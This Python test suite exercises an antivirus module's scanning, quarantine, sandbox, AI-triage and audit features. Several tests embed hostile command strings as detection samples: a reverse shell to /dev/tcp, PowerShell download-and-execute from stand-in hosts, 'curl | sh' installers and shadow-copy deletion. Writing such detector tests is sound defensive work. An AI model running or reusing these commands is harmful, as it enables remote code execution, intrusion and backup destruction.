"""Tests for Ember's malware-defense layer (antivirus.py).

Runnable two ways:
    pytest test_antivirus.py
    python test_antivirus.py        # runs every test, prints a PASS/FAIL summary

All state (config + quarantine vault) is redirected to a throwaway directory and
VirusTotal is disabled, so the tests are hermetic and never touch the network or
the real user profile.
"""
import os
import tempfile
from pathlib import Path

# Isolate all on-disk state BEFORE importing the module under test.
_TMP = tempfile.mkdtemp(prefix="ember_av_test_")
os.environ["EMBER_SUPPORT_DIR"] = _TMP
os.environ.pop("VIRUSTOTAL_API_KEY", None)
os.environ.pop("VT_API_KEY", None)

import antivirus

# Belt-and-braces: ensure no online lookups happen during tests.
antivirus.set_config(vt_api_key="", vt_hash_lookup=False, vt_upload_unknown=False)


def _write(name: str, data) -> Path:
    p = Path(_TMP) / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


def test_clean_file_is_clean():
    p = _write("notes.txt", "just some harmless text\n")
    r = antivirus.scan_file(str(p), deep=False)
    assert r["ok"] and r["verdict"] == "clean", r


def test_scan_result_is_explainable_and_does_not_overclaim_safety():
    p = _write("explainable.txt", "ordinary business document\n")
    r = antivirus.scan_file(str(p), deep=False)
    assert r["classification"] == "no-known-threats", r
    assert r["assurance"] == "no-known-threats", r
    assert r["confidence"] in ("limited", "moderate"), r
    assert r["detection_id"].startswith("EMB-")
    assert isinstance(r["coverage"], dict) and isinstance(r["evidence"], list)
    assert r["privacy"]["file_uploaded"] is False


def test_unknown_sample_upload_is_private_by_default():
    assert antivirus.DEFAULT_CONFIG["vt_upload_unknown"] is False
    assert antivirus.DEFAULT_CONFIG["on_malware"] == "quarantine"


def test_legacy_policy_migrates_to_consent_and_evidence_preservation():
    import json
    old = os.environ["EMBER_SUPPORT_DIR"]
    isolated = tempfile.mkdtemp(prefix="ember_legacy_security_")
    os.environ["EMBER_SUPPORT_DIR"] = isolated
    try:
        antivirus._config_path().write_text(json.dumps({
            "on_malware": "quarantine_autodelete",
            "vt_upload_unknown": True,
        }), "utf-8")
        cfg = antivirus.get_config()
        assert cfg["on_malware"] == "quarantine"
        assert cfg["vt_upload_unknown"] is False
        assert cfg["response_policy_version"] == 2
    finally:
        os.environ["EMBER_SUPPORT_DIR"] = old


def test_eicar_is_malicious():
    p = _write("eicar.com", antivirus.EICAR_SIG)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "malicious", r


def test_executable_disguised_as_pdf_is_suspicious():
    p = _write("invoice.pdf", b"MZ\x90\x00" + b"\x00" * 64)  # PE magic in a "pdf"
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "suspicious", r
    assert any("disguised" in x for x in r["reasons"]), r


def test_double_extension_is_flagged():
    p = _write("photo.jpg.exe", b"MZ\x90\x00" + b"\x00" * 32)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] in ("suspicious", "malicious"), r


def test_quarantine_list_and_restore_roundtrip():
    p = _write("sample1.exe", b"MZ\x00\x00")
    q = antivirus.quarantine_file(str(p))
    assert q["ok"] and not p.exists(), q
    assert antivirus.list_quarantine()["count"] >= 1
    dest = Path(_TMP) / "restored.exe"
    r = antivirus.restore_quarantined(q["id"], str(dest))
    assert r["ok"] and dest.exists(), r


def test_quarantine_ids_do_not_collide_for_identical_files():
    a = _write("same-a.bin", b"identical evidence")
    b = _write("same-b.bin", b"identical evidence")
    qa = antivirus.quarantine_file(str(a))
    qb = antivirus.quarantine_file(str(b))
    assert qa["ok"] and qb["ok"]
    assert qa["id"] != qb["id"] and qa["stored_path"] != qb["stored_path"]


def test_quarantine_integrity_blocks_tampered_restore():
    p = _write("tamper-me.bin", b"original evidence")
    q = antivirus.quarantine_file(str(p))
    stored = Path(q["stored_path"])
    os.chmod(stored, 0o600)
    stored.write_bytes(b"altered after containment")
    verification = antivirus.verify_quarantined(q["id"])
    assert verification["ok"] and verification["integrity_ok"] is False
    restored = antivirus.restore_quarantined(q["id"])
    assert restored["ok"] is False and "integrity" in restored["error"]
    assert stored.exists()


def test_failed_quarantine_delete_keeps_index_entry():
    p = _write("undeletable.bin", b"retain index on failure")
    q = antivirus.quarantine_file(str(p))
    stored = Path(q["stored_path"])
    original_unlink = Path.unlink
    def fail_this(path_obj, *args, **kwargs):
        if path_obj == stored:
            raise PermissionError("simulated delete denial")
        return original_unlink(path_obj, *args, **kwargs)
    Path.unlink = fail_this
    try:
        result = antivirus.delete_quarantined(q["id"])
        assert result["ok"] is False
        assert any(item["id"] == q["id"] for item in antivirus.list_quarantine()["items"])
    finally:
        Path.unlink = original_unlink


def test_purge_expired_deletes_after_grace_period():
    antivirus.set_config(on_malware="quarantine_autodelete", autodelete_days=1)
    p = _write("sample2.exe", b"MZ\x00\x01")
    q = antivirus.quarantine_file(str(p))
    entries = antivirus._load_index()
    for e in entries:
        if e["id"] == q["id"]:
            e["delete_after"] = 1  # an epoch firmly in the past
    antivirus._save_index(entries)
    try:
        res = antivirus.purge_expired()
        assert q["id"] in res["purged"], res
        assert not Path(q["stored_path"]).exists()
    finally:
        antivirus.set_config(on_malware="quarantine", autodelete_days=30)


def test_gate_download_quarantines_malicious():
    p = _write("download_eicar.bin", antivirus.EICAR_SIG)
    g = antivirus.gate_download(str(p))
    assert g["scanned"] and g["verdict"] == "malicious" and g.get("blocked"), g
    assert not p.exists()  # moved into quarantine


def test_gate_open_blocks_malicious_allows_clean():
    bad = _write("open_eicar.bin", antivirus.EICAR_SIG)
    gb = antivirus.gate_open(str(bad))
    assert gb["scanned"] and gb["allowed"] is False, gb
    good = _write("open_ok.txt", "hello\n")
    gg = antivirus.gate_open(str(good))
    assert gg["allowed"] is True, gg


def test_sandbox_runs_or_refuses_but_never_runs_unconfined():
    script = _write("hello.py", "print('hello from sandbox')\n")
    r = antivirus.run_in_sandbox(str(script), timeout=20)
    assert "ok" in r
    if r["ok"]:
        assert r.get("sandbox"), r          # ran -> must report which sandbox
    else:
        # No sandbox tech available -> it MUST refuse, not execute unconfined.
        assert "error" in r, r


def test_sandbox_refuses_known_malicious():
    bad = _write("evil.py", antivirus.EICAR_SIG)  # definitively malicious content
    r = antivirus.run_in_sandbox(str(bad), timeout=10)
    assert r["ok"] is False and r.get("refused") is True, r


def test_security_status_reports_engines():
    s = antivirus.security_status()
    assert s["ok"] and "heuristics" in s["engines_available"], s


def test_config_roundtrip():
    antivirus.set_config(autodelete_days=3)
    assert antivirus.get_config()["autodelete_days"] == 3
    antivirus.set_config(autodelete_days=30)


def test_ai_triage_never_clears_engine_findings():
    antivirus.set_ai_judge(lambda items: [False for _ in items])
    finding = {"path": str(_write("triage.ps1", "Write-Host hello\n")),
               "verdict": "suspicious", "reasons": ["script requires review"]}
    kept, cleared = antivirus.ai_review_flagged([finding])
    assert cleared == []
    assert len(kept) == 1 and kept[0]["ai_assessment"] == "likely-benign"
    assert kept[0]["verdict"] == "suspicious"
    antivirus.set_ai_judge(None)


def test_legacy_delete_policy_is_overridden_by_containment():
    antivirus.set_config(on_malware="delete")
    p = _write("legacy-delete-eicar.com", antivirus.EICAR_SIG)
    scan = antivirus.scan_file(str(p), deep=False)
    handled = antivirus._handle_malicious(str(p), scan)
    try:
        assert handled["ok"] and handled["action"] == "quarantined", handled
        assert not p.exists()
        assert any(i["id"] == handled["id"] for i in antivirus.list_quarantine()["items"])
    finally:
        antivirus.set_config(on_malware="quarantine")


def test_manual_retention_cancels_old_auto_delete_deadlines():
    antivirus.set_config(on_malware="quarantine")
    p = _write("retain-evidence.bin", b"incident evidence")
    q = antivirus.quarantine_file(str(p))
    entries = antivirus._load_index()
    for entry in entries:
        if entry.get("id") == q["id"]:
            entry["delete_after"] = 1
    antivirus._save_index(entries)
    result = antivirus.purge_expired()
    assert q["id"] not in result["purged"]
    assert Path(q["stored_path"]).exists()
    assert next(e for e in antivirus._load_index() if e["id"] == q["id"])["delete_after"] is None


def test_security_audit_chain_and_report_redact_credentials():
    old = os.environ["EMBER_SUPPORT_DIR"]
    isolated = tempfile.mkdtemp(prefix="ember_endpoint_audit_")
    os.environ["EMBER_SUPPORT_DIR"] = isolated
    try:
        antivirus.audit_event("test_detection", {"detection_id": "EMB-123"})
        antivirus.audit_event("test_containment", {"quarantine_id": "q-1"})
        audit = antivirus.security_audit()
        assert audit["integrity_ok"] is True and audit["total"] == 2, audit
        antivirus.set_config(vt_api_key="super-secret-security-key")
        report = antivirus.security_report()
        blob = str(report)
        assert "super-secret-security-key" not in blob
        assert report["policy"]["vt_api_key_configured"] is True
        # Altering a retained record is detected.
        lines = antivirus._audit_path().read_text("utf-8").splitlines()
        lines[0] = lines[0].replace("test_detection", "tampered_detection")
        antivirus._audit_path().write_text("\n".join(lines) + "\n", "utf-8")
        assert antivirus.security_audit()["integrity_ok"] is False
    finally:
        os.environ["EMBER_SUPPORT_DIR"] = old


# --- stronger static analysis: entropy + behavioral IOCs -----------------------

def test_entropy_distinguishes_random_from_text():
    assert antivirus.shannon_entropy(os.urandom(8192)) > 7.5
    assert antivirus.shannon_entropy(b"the quick brown fox " * 400) < 5.0


def test_ioc_engine_flags_attacks_but_not_benign():
    bad = [
        "powershell -nop -w hidden -enc " + "A" * 60,
        'IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")',
        "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
        "vssadmin delete shadows /all /quiet",
    ]
    for c in bad:
        r = antivirus.scan_command_line(c)
        assert r["verdict"] == "malicious", (c, r)
    for c in ("ls -la", "git status", "python3 -m http.server"):
        assert antivirus.scan_command_line(c)["verdict"] == "clean", c


def test_script_with_ioc_is_flagged_not_clean():
    # A SCRIPT that carries a download-and-execute payload (high-severity IOC).
    # NB: IOC scanning is intentionally restricted to script types now — scanning prose
    # (.txt/.md) for indicator strings flagged docs + the scanner's own signature DB.
    body = ('echo hello\n'
            'IEX (New-Object Net.WebClient).DownloadString("http://evil/x.ps1")\n')
    p = _write("payload.ps1", body)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] in ("suspicious", "malicious"), r
    assert any("indicator" in x for x in r["reasons"]), r
    assert "ioc-signatures" in r["engines"], r


def test_prose_with_ioc_words_not_flagged():
    # A .txt/.md that merely MENTIONS techniques must NOT be flagged (false-positive guard).
    body = "Notes on mimikatz, vssadmin delete shadows, and reverse shells via /dev/tcp."
    p = _write("security_notes.md", body)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "clean", r


def test_eicar_detected_past_first_8kb():
    # EICAR hidden after 8KB of padding must still be caught (was only scanned in head).
    body = (b"A" * 20000) + antivirus.EICAR_SIG
    p = _write("padded.bin", body)
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "malicious", r


def test_restore_does_not_overwrite_existing():
    import os
    p = _write("victim.exe", antivirus.EICAR_SIG)
    q = antivirus.quarantine_file(str(p))
    assert q["ok"], q
    # Something else now occupies the original path.
    _write("victim.exe", b"a different, innocent file")
    r = antivirus.restore_quarantined(q["id"])
    assert r["ok"], r
    # The innocent file must be untouched; the restore lands at a non-clobbering name.
    assert os.path.exists(str(Path(_TMP) / "victim.exe"))
    assert Path(r["restored_to"]).name != "victim.exe" or r["restored_to"] != str(Path(_TMP) / "victim.exe")


def test_compressed_container_not_flagged_on_entropy():
    # A high-entropy .dmg (every installer) must NOT be 'suspicious' just for entropy.
    import os
    p = _write("Installer.dmg", os.urandom(200_000))
    r = antivirus.scan_file(str(p), deep=False)
    assert r["verdict"] == "clean", r


def test_signature_db_hash_is_malicious():
    import json
    from pathlib import Path
    p = _write("benign_payload.bin", b"totally ordinary bytes here")
    sha = antivirus.sha256_file(p)
    sig_path = Path(_TMP) / "signatures.json"
    sig_path.write_text(json.dumps({"sha256": [sha]}), "utf-8")
    antivirus._SIG_CACHE = None  # invalidate cache so the new DB is picked up
    try:
        r = antivirus.scan_file(str(p), deep=False)
        assert r["verdict"] == "malicious", r
    finally:
        sig_path.unlink(missing_ok=True)
        antivirus._SIG_CACHE = None


def test_archive_with_eicar_member_is_malicious():
    import zipfile
    z = Path(_TMP) / "bundle.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("notes.txt", "hello")
        zf.writestr("inner/payload.bin", antivirus.EICAR_SIG)
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "malicious", r


def test_archive_with_disguised_exe_member_is_suspicious():
    import zipfile
    z = Path(_TMP) / "photos.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("vacation.jpg", b"MZ\x90\x00" + b"\x00" * 64)  # PE wearing .jpg
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "suspicious", r
    assert "archive" in r["engines"], r


def test_clean_archive_is_clean():
    import zipfile
    z = Path(_TMP) / "clean.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("a.txt", "just text\n")
        zf.writestr("b.csv", "1,2,3\n")
    r = antivirus.scan_file(str(z), deep=False)
    assert r["verdict"] == "clean", r


def test_status_reports_strong_engines():
    s = antivirus.security_status()
    assert "ioc-signatures" in s["engines_available"], s
    assert "fileless-behavioral" in s["engines_available"], s
    assert "fileless_protection" in s


def test_native_sandbox_runs_a_copy_not_the_original():
    """The sandbox must run a throwaway COPY — never chmod (+x) or execute the user's
    real file in place, and never leak the temp copy."""
    src = _write("sample.sh", "echo hi\n")
    os.chmod(src, 0o644)
    orig_mode = src.stat().st_mode

    captured = {}

    class _R:
        returncode = 0
        stdout = "hi"
        stderr = ""

    def _fake_run(full, **kw):
        captured["full"] = list(full)
        return _R()

    real_platform = antivirus.sys.platform
    real_which = antivirus._which
    real_run = antivirus.subprocess.run
    try:
        antivirus.sys.platform = "linux"
        antivirus._which = lambda name: "/usr/bin/firejail" if name == "firejail" else None
        antivirus.subprocess.run = _fake_run
        out = antivirus._run_native_sandbox(Path(src), [], 5)
    finally:
        antivirus.sys.platform = real_platform
        antivirus._which = real_which
        antivirus.subprocess.run = real_run

    assert out.get("ok") is True, out
    joined = " ".join(captured["full"])
    # The original file path must NOT appear in the executed command…
    assert str(src) not in joined, captured["full"]
    # …a staged copy in a throwaway dir must.
    copy_parts = [x for x in captured["full"] if "ember_sbx_" in x]
    assert copy_parts, captured["full"]
    # The user's real file keeps its original permissions (no +x side effect).
    assert src.stat().st_mode == orig_mode
    # And the temp copy is cleaned up afterwards.
    assert not os.path.exists(os.path.dirname(copy_parts[-1]))


def _reset_gate_state():
    antivirus.set_ai_judge(None)
    antivirus.set_config(ai_scan_on_open=True, require_confirm_unconfirmed=True,
                         scan_before_open=True, enabled=True)
    try:
        antivirus._cleared_path().unlink()
    except Exception:
        pass


def test_gate_open_allows_clean_document():
    _reset_gate_state()
    p = _write("readme.txt", "plain text, nothing risky\n")
    g = antivirus.gate_open(str(p))
    assert g["allowed"] is True and g["verdict"] == "clean", g


def test_gate_open_holds_unconfirmed_script():
    _reset_gate_state()
    p = _write("setup_helper.py", "print('hello world')\n")   # clean content, but executable type
    g = antivirus.gate_open(str(p))
    assert g["allowed"] is False and g.get("needs_confirmation") is True, g


def test_confirm_makes_it_open():
    _reset_gate_state()
    p = _write("tool.py", "print('ok')\n")
    assert antivirus.gate_open(str(p))["allowed"] is False
    c = antivirus.confirm_file_safe(str(p))
    assert c["ok"] and c["sha256"], c
    g = antivirus.gate_open(str(p))
    assert g["allowed"] is True and g.get("cleared") is True, g
    # listing + revoke round-trip
    assert any(f["sha256"] == c["sha256"] for f in antivirus.list_cleared_files()["files"])
    antivirus.unconfirm_file(str(p))
    assert antivirus.gate_open(str(p))["allowed"] is False
    _reset_gate_state()


def test_gate_open_blocks_malicious():
    _reset_gate_state()
    p = _write("nasty.com", antivirus.EICAR_SIG)
    g = antivirus.gate_open(str(p))
    assert g["allowed"] is False and g["verdict"] == "malicious", g


def test_ai_judge_flags_unconfirmed_file():
    _reset_gate_state()
    antivirus.set_ai_judge(lambda items: [True for _ in items])   # AI says "harmful"
    p = _write("dropper.py", "import os\n")
    g = antivirus.gate_open(str(p))
    assert g["allowed"] is False and g.get("ai_verdict") == "malicious", g
    _reset_gate_state()


def test_ai_clean_still_held_until_user_confirms():
    _reset_gate_state()
    antivirus.set_ai_judge(lambda items: [False for _ in items])  # AI finds nothing harmful
    p = _write("script.sh", "echo hi\n")
    g = antivirus.gate_open(str(p))
    # AI didn't flag it, but it's unconfirmed -> still held for the user's confirmation.
    assert g["allowed"] is False and g.get("needs_confirmation") is True
    assert g.get("ai_verdict") == "clean", g
    _reset_gate_state()


def test_clamav_scan_error_is_not_reported_as_clean():
    # A backend that ERRORED (encrypted/corrupt archive, engine failure) must NOT be listed as an
    # engine that cleared the file, and the result must carry scan_error=True. Previously a
    # clamscan error (rc 2) was returned as malicious:False and blindly credited, so an
    # unscannable file was reported "clean" with clamav proudly listed as having passed it.
    _reset_gate_state()
    orig = antivirus._scan_clamav
    antivirus._scan_clamav = lambda p: {"engine": "clamav", "malicious": False,
                                        "error": "password-protected archive", "scan_error": True}
    try:
        p = _write("locked.txt", "ordinary text\n")
        r = antivirus.scan_file(str(p), deep=False)
        assert r["scan_error"] is True, r
        assert "clamav" not in r["engines"]                  # not credited as a passed engine
        assert "clamav (scan error)" in r["engines"]
    finally:
        antivirus._scan_clamav = orig


def test_gate_open_holds_a_file_whose_scan_errored():
    # block_on_scan_error is on by default -> a partly-unscannable file must be HELD for review,
    # not opened on the strength of a scan that didn't actually complete.
    _reset_gate_state()
    antivirus.set_ai_judge(lambda items: [False for _ in items])   # AI finds nothing harmful
    orig = antivirus._scan_clamav
    antivirus._scan_clamav = lambda p: {"engine": "clamav", "malicious": False,
                                        "error": "corrupt archive", "scan_error": True}
    try:
        p = _write("report.txt", "just a normal document\n")    # otherwise-clean content
        g = antivirus.gate_open(str(p))
        assert g["allowed"] is False and g.get("needs_confirmation") is True, g
    finally:
        antivirus._scan_clamav = orig
        _reset_gate_state()


def _make_ember_tree(marker: bool = True) -> Path:
    """A folder that fingerprints as an Ember source tree (checkout / copy), with files that
    would otherwise be flagged (a security module's IOC strings + an executable script)."""
    import tempfile as _tf
    d = Path(_tf.mkdtemp(prefix="ember_tree_")) / "Ember"
    d.mkdir()
    (d / "agent.py").write_text("# agent\n")
    (d / "antivirus.py").write_text("# security module (contains IOC strings)\n")
    (d / "version.py").write_text('__version__="1"\n' + ('GITHUB_REPO = "EmberAI"\n' if marker else ""))
    (d / "install.sh").write_text("#!/bin/bash\ncurl http://x | sh\n")           # download-exec + .sh
    (d / "test_fileless_guard.py").write_text("x = 'bash -i >& /dev/tcp/1.2.3.4/9'\n")  # reverse-shell
    return d


def test_ember_source_tree_is_skipped_even_when_not_the_running_dir():
    # The bug: a scan of Ember's OWN code (a checkout/copy, not the running install) flagged its
    # security modules + tests as malware. An Ember tree must be recognised by its fingerprint
    # wherever it lives and skipped entirely.
    antivirus._EMBER_TREE_CACHE.clear()
    tree = _make_ember_tree()
    assert antivirus._is_ember_own(tree / "install.sh") is True
    assert antivirus._is_ember_own(tree / "test_fileless_guard.py") is True
    r = antivirus.scan_directory(str(tree), deep=False)
    assert r["ok"] and r["flagged_count"] == 0 and r["scanned"] == 0, r


def test_real_threats_outside_ember_are_still_caught():
    # The exclusion must not become a blanket bypass: the SAME nasty file in an ordinary folder
    # is still flagged.
    antivirus._EMBER_TREE_CACHE.clear()
    import tempfile as _tf
    d = Path(_tf.mkdtemp(prefix="downloads_"))
    (d / "install.sh").write_text("#!/bin/bash\ncurl http://x | sh\n")
    assert antivirus._is_ember_own(d / "install.sh") is False
    r = antivirus.scan_directory(str(d), deep=False)
    assert r["scanned"] == 1 and r["flagged_count"] >= 1, r


def test_spoofed_ember_tree_is_not_trusted():
    # A folder that merely has files NAMED like Ember's but without the version.py marker must not
    # be trusted (so malware can't cloak itself by dropping an agent.py/antivirus.py).
    antivirus._EMBER_TREE_CACHE.clear()
    spoof = _make_ember_tree(marker=False)
    assert antivirus._is_ember_own(spoof / "install.sh") is False
    r = antivirus.scan_directory(str(spoof), deep=False)
    assert r["flagged_count"] >= 1, r


def _run_all() -> bool:
    import types
    funcs = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and isinstance(v, types.FunctionType)]
    passed = 0
    for fn in funcs:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
            passed += 1
        except Exception as e:
            print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{passed}/{len(funcs)} passed")
    return passed == len(funcs)


if __name__ == "__main__":
    import sys
    sys.exit(0 if _run_all() else 1)
